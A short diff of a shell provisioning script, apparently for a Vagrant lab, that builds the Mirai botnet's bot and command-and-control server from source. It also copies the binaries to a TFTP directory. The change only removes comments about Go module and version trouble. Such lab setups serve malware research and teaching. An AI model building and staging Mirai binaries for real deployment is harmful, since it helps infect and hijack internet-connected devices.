@@ -37,10 +37,10 @@ dnsmasq
 echo ">>> Building mirai bot and cnc..."
 cd /vagrant/mirai-code/mirai/
 
-echo ">>> Getting go requirements..." # The problem is the no required module provides package. Check this out: https://stackoverflow.com/questions/66894200/error-message-go-go-mod-file-not-found-in-current-directory-or-any-parent-dire
+echo ">>> Getting go requirements..."
 go mod init mirai-go
-go get github.com/go-sql-driver/mysql # Esto hay que arreglarlo, mirar de instalar otra versión de go: https://www.cyberithub.com/how-to-install-latest-version-of-go-on-ubuntu-20-04/
-go get github.com/mattn/go-shellwords # Esto hay que arreglarlo, mirar de instalar otra versión de go: https://www.cyberithub.com/how-to-install-latest-version-of-go-on-ubuntu-20-04/
+go get github.com/go-sql-driver/mysql
+go get github.com/mattn/go-shellwords
 
 ./build.sh release telnet
 cp /vagrant/mirai-code/mirai/release/mirai* /vagrant/tftp/
